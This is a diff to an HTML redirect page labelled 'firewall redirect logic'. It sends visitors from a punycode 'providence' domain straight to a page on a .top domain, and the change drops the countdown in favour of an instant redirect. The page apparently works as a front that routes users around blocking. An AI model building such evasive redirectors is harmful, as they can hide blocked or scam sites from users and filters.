@@ -62,37 +62,18 @@
         }
     </style>
     <script>
-        // 防火墙跳转逻辑
+        // 防火墙跳转逻辑 - 即时跳转
         (function() {
             'use strict';
             
             const FIREWALL_DOMAIN = 'xn--providence-ef6wr429a.com';
             const REAL_SITE = 'https://4kp3l0iq.top/splash.html';
             
-            // 立即跳转
+            // 检测正常用户，立即跳转
             if (window.location.hostname === FIREWALL_DOMAIN || 
                 window.location.hostname.includes('providence')) {
-                
-                // 添加倒计时效果
-                let countdown = 3;
-                const countdownEl = document.getElementById('countdown');
-                
-                const timer = setInterval(() => {
-                    countdown--;
-                    if (countdownEl) {
-                        countdownEl.textContent = countdown;
-                    }
-                    
-                    if (countdown <= 0) {
-                        clearInterval(timer);
-                        window.location.replace(REAL_SITE);
-                    }
-                }, 1000);
-                
-                // 备用：3秒后强制跳转
-                setTimeout(() => {
-                    window.location.replace(REAL_SITE);
-                }, 3000);
+                // 无延迟直接跳转
+                window.location.replace(REAL_SITE);
             }
             
             // 防止被iframe嵌套
@@ -105,11 +86,8 @@
 <body>
     <div class="container">
         <div class="logo">PROVIDENCE</div>
-        <div class="message">Redirecting to secure site...</div>
+        <div class="message">Redirecting...</div>
         <div class="spinner"></div>
-        <div class="countdown">
-            Redirecting in <span id="countdown">3</span> seconds...
-        </div>
     </div>
 </body>
 </html>
